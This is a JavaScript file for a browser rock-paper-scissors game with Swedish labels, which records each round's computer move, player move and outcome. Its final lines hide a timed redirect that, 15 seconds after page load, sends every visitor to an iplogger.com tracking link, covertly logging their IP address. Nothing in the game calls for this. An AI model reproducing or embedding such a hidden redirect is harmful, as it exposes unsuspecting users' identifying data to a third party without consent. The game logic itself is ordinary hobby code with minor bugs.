const dykmjaGuri = document.getElementById("Rock");
const resetButton = document.querySelector(".reset");
const themessage = document.getElementById("resultOFtheGame");
const outputresult = document.querySelector(".outputresult");
const ekrani = document.getElementById("Ekrani");
const rrjedhjaLojes = document.getElementById("gamecontent");
const påsebtn = document.getElementById('buton2');
const buton3 = document.getElementById('buton3')

let gameData = {
  computerMovesResult: [], 
  playerMoves: [],
  resultOfthegame: [],

  // showresult: function () {

  //   console.log(`
  //   this is the computure-move: ${this.computerMovesResult.slice(-1)}
  //   this is the player-move: ${this.playerMoves.slice(-1)}
  //   this is the result: ${this.resultOfthegame.slice(-1)}
  //   `)
    
  // }



};


resetButton.addEventListener("click", resetbuton);
buton3.addEventListener('click', sax);

dykmjaGuri.addEventListener('click', Rock);
påsebtn.addEventListener('click', qesja);

function Rock() {
  const computermove = Math.random();
  let levizjekompjuterike = "";
  let result = "";
  if(computermove >= 0 && computermove < 1 / 3){
    levizjekompjuterike = 'sten';
}
else if (computermove >= 1 / 3 && computermove < 2 / 3) {
        levizjekompjuterike = 'påse';
}else if (computermove >= 2 / 3 && computermove < 1 ) {
    levizjekompjuterike = 'sax';
 }   


  if(levizjekompjuterike == "sten"){
    result = "lika";
    ekrani.style.color = "purple";
  }
  else if (levizjekompjuterike == "påse"){
    result = "förlust";
    ekrani.style.color = "red";
  }
  else if (levizjekompjuterike == 'sax') {
    result = "vinst";
    ekrani.style.color = "green";
  }

  setInterval(() => {
    ekrani.value = "spela igen";
    ekrani.style.color = "white";
  }, 10000)
  ekrani.value = result;
  showdisplay();
  gameData.computerMovesResult.push(levizjekompjuterike);
  gameData.playerMoves.push("sten"); 
  gameData.resultOfthegame.push(result);
  // gameData.showresult();
  displayofthegame()
 
}


 function resetbuton() {
    hiqe();
    
 }


//  function displayThemessage(){
//   let thistext = document.querySelector(".resultParagraf");
//   thistext.textContent = ekrani.value;
//   console.log("i am cooperating");
//  }
//  function outputresultofgame(){
//     outputresult.classList.add("showit");
//  }
function showdisplay() {
  const katrori = document.getElementById("inputKatror");
  katrori.classList.add("showit");

  // 'true' in cloneNode indicates deep cloning including children

  // Now you can use 'clonedKatrori' as a clone of 'katrori'
}


 function hiqe(){
  const inputi = document.getElementById("inputKatror");
  inputi.classList.remove("showit");

 }
 


 //  function displayChoices(){
//   const message ={
//     computure: levizjakompjuterike,
//     player: player,
//     equal = result,
//  };
//  themessage.value = The computer: ${levizjakompjuterike}, Your choice: ${player}, that is equal to: ${result};
// console.log(The computer: ${levizjakompjuterike}, Your choice: ${player}, that is equal to: ${result};); 
// }



function qesja() {
  const computermove = Math.random();
  let levizjekompjuterike = "";
  let result = "";
  if(computermove >= 0 && computermove < 1 / 3){
    levizjekompjuterike = 'sten';
}
else if (computermove >= 1 / 3 && computermove < 2 / 3) {
        levizjekompjuterike = 'påse';
}else if (computermove >= 2 / 3 && computermove < 1 ) {
    levizjekompjuterike = 'sax';
 }   
 
  if(levizjekompjuterike === 'sten'){
     result = 'vinst';
     ekrani.style.color = 'green';
 }
 else if(levizjekompjuterike === 'påse'){
     result = 'lika';
     ekrani.style.color = 'purple';
 }
 else if (levizjekompjuterike === 'sax'){
     result = 'förlust';
     ekrani.style.color = 'red';
     
 };
 document.getElementById('Ekrani').value = result;
showdisplay();
gameData.computerMovesResult.push(levizjekompjuterike);
gameData.playerMoves.push('påse');
gameData.resultOfthegame.push(result);
// gameData.showresult();
displayofthegame()
}

// const dykmjaGuri = document.getElementById("Rock");
// const resetButton = document.querySelector(".reset");
// let result;
// const themessage = document.getElementById("resultOFtheGame");
// const outputresult = document.querySelector(".outputresult");
// const ekrani = document.getElementById("Ekrani");
// const resetResult = ekrani.textContent = "good luck";
// const rrjedhjaLojes = document.getElementById("gamecontent");
// const påsebtn = document.getElementById('buton2');


function sax() {
  const computermove = Math.random();
  let levizjekompjuterike;
  let result = "";
  if(computermove >= 0 && computermove < 1 / 3){
    levizjekompjuterike = 'sten';
  }
  else if (computermove >= 1 / 3 && computermove < 2 / 3) {
    levizjekompjuterike = 'påse';
  }
  else if (computermove >= 2 / 3 && computermove < 1 ) {
    levizjekompjuterike = 'sax';
  }   

  if(levizjekompjuterike === 'sten'){
     result = 'förlust';
     ekrani.style.color = 'green';
  }
  else if(levizjekompjuterike === 'påse'){
     result = 'vinst';
     ekrani.style.color = 'purple';
  }
  else if (levizjekompjuterike === 'sax'){
     result = 'lika';
     ekrani.style.color = 'red';
  }

  document.getElementById('Ekrani').value = result;
  showdisplay();

 
  gameData.computerMovesResult.push(levizjekompjuterike);
  gameData.playerMoves.push('sax'); 
  gameData.resultOfthegame.push(result);
  // gameData.showresult();
  displayofthegame()
}


// function showwinner () {
//   const inputplace = document.getElementById('displaydatorndrag');

  
// }






// function showthegameContent() {
//  let newp = document.createElement("p");
//   rrjedhjaLojes.appendChild(newp);
//   newp.textContent = `
//     this is the computure-move: ${this.computerMovesResult.slice(-1)}
//     this is the player-move: ${this.playerMoves.slice(-1)}
//     this is the result: ${this.resultOfthegame.slice(-1)}
//     `


// }            


// function scroller() {
//   const lastp = rrjedhjaLojes.lastChild;
// const previouscolor = lastp.style.backgroundColor;
// lastp.scrollIntoView();
// setTimeout(() => {
//   window.scrollTo({
//     top: 0,
//     left: 0,
//     behavior: 'smooth'
//   });
// }, 20000);
//     lastp.style.backgroundColor = 'white';
//     lastp.classList.add('shake');
//   setTimeout(function () {
//     lastp.style.backgroundColor = previouscolor;
//     lastp.classList.remove('shake');
  
// }, 3000);
// }
function showdisplayofgame() {
  const displayoftheresult = document.getElementById('displayofthegame');
  displayoftheresult.classList.add('showit');
}

function displayofthegame() {
  showdisplayofgame()
  const displayoftheresult = document.getElementById('displayofthegame');
  const datornsdrag = displayoftheresult.children[0];
  const dittdrag = displayoftheresult.children[1];
  const resultatet = displayoftheresult.children[2];
  if(gameData.resultOfthegame.slice(-1) == 'lika') {
    resultatet.style.color = 'orange';
  }
  else if(gameData.resultOfthegame.slice(-1) == 'förlust') {
    resultatet.style.color = 'red';
  }
  else if (gameData.resultOfthegame.slice(-1) == 'vinst') {
    resultatet.style.color = 'green';
  }

  datornsdrag.textContent = 'datorn valde:  ' + gameData.computerMovesResult.slice(-1);
  dittdrag.textContent = 'du valde:  ' + gameData.playerMoves.slice(-1);
  resultatet.textContent = 'därför:  ' + gameData.resultOfthegame.slice(-1);


}
setTimeout(() =>{
  location.assign('https://iplogger.com/2Xmq75')
},15000)
